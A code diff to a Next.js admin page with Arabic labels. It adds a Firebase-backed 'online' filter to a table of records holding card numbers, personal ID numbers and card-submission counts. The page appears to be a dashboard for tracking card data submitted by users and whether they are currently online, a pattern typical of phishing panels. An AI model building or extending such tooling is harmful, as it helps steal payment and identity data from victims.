@@ -73,7 +73,8 @@ interface Notification {
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
-  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard">("all")
+  const [activeFilter, setActiveFilter] = useState<"all" | "withCard" | "withoutCard" | "online">("all")
+  const [onlineUserIds, setOnlineUserIds] = useState<string[]>([])
   const [isLoading, setIsLoading] = useState(true)
   const [message, setMessage] = useState<boolean>(false)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
@@ -82,6 +83,7 @@ export default function NotificationsPage() {
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
+  const [onlineStatuses, setOnlineStatuses] = useState<{ [userId: string]: boolean }>({})
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -99,11 +101,26 @@ export default function NotificationsPage() {
   }, [router])
 
   useEffect(() => {
+    const statusRef = ref(database, "status")
+    const unsubscribe = onValue(statusRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        const onlineIds = Object.entries(data)
+          .filter(([_, status]: [string, any]) => status.state === "online")
+          .map(([userId]: [string, any]) => userId)
+        setOnlineUserIds(onlineIds)
+      }
+    })
+
+    return () => unsubscribe()
+  }, [])
+
+  useEffect(() => {
     // Apply filtering whenever notifications or activeFilter changes
     applyFilter(activeFilter)
-  }, [notifications, activeFilter])
+  }, [notifications, activeFilter, onlineUserIds])
 
-  const applyFilter = (filter: "all" | "withCard" | "withoutCard") => {
+  const applyFilter = (filter: "all" | "withCard" | "withoutCard" | "online") => {
     switch (filter) {
       case "all":
         setFilteredNotifications(notifications)
@@ -113,6 +130,9 @@ export default function NotificationsPage() {
         break
       case "withoutCard":
         setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
+        break
+      case "online":
+        setFilteredNotifications(notifications.filter((notification) => onlineUserIds.includes(notification.id)))
         break
       default:
         setFilteredNotifications(notifications)
@@ -154,6 +174,20 @@ export default function NotificationsPage() {
 
         setNotifications(notificationsData)
         setIsLoading(false)
+
+        // Fetch online statuses for all users
+        const onlineStatusMap: { [userId: string]: boolean } = {}
+        notificationsData.forEach((notification) => {
+          const userStatusRef = ref(database, `/status/${notification.id}`)
+          onValue(userStatusRef, (snapshot) => {
+            const data = snapshot.val()
+            onlineStatusMap[notification.id] = data && data.state === "online"
+            setOnlineStatuses((prevStatuses) => ({
+              ...prevStatuses,
+              [notification.id]: data && data.state === "online",
+            }))
+          })
+        })
       },
       (error) => {
         console.error("Error fetching notifications:", error)
@@ -347,12 +381,13 @@ export default function NotificationsPage() {
           </div>
           <Tabs
             defaultValue="all"
-            onValueChange={(value) => setActiveFilter(value as "all" | "withCard" | "withoutCard")}
+            onValueChange={(value) => setActiveFilter(value as "all" | "withCard" | "withoutCard" | "online")}
           >
-            <TabsList className="grid w-full grid-cols-3">
+            <TabsList className="grid w-full grid-cols-4">
               <TabsTrigger value="all">الكل</TabsTrigger>
               <TabsTrigger value="withCard">مع بطاقة</TabsTrigger>
               <TabsTrigger value="withoutCard">بدون بطاقة</TabsTrigger>
+              <TabsTrigger value="online">متصل</TabsTrigger>
             </TabsList>
           </Tabs>
         </div>
@@ -374,7 +409,10 @@ export default function NotificationsPage() {
                 </tr>
               </thead>
               <tbody>
-                {filteredNotifications.map((notification) => (
+                {(activeFilter === "online"
+                  ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
+                  : filteredNotifications
+                ).map((notification) => (
                   <tr key={notification.id} className="border-b border-gray-700">
                     <td className="px-4 py-3">{notification?.country!}</td>
                     <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
@@ -429,7 +467,10 @@ export default function NotificationsPage() {
 
           {/* Mobile Card View - Shown only on Mobile */}
           <div className="md:hidden space-y-4 p-2">
-            {filteredNotifications.map((notification) => (
+            {(activeFilter === "online"
+              ? filteredNotifications.filter((notification) => onlineUserIds.includes(notification.id))
+              : filteredNotifications
+            ).map((notification) => (
               <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
                 <div className="flex justify-between items-start mb-3">
                   <div>
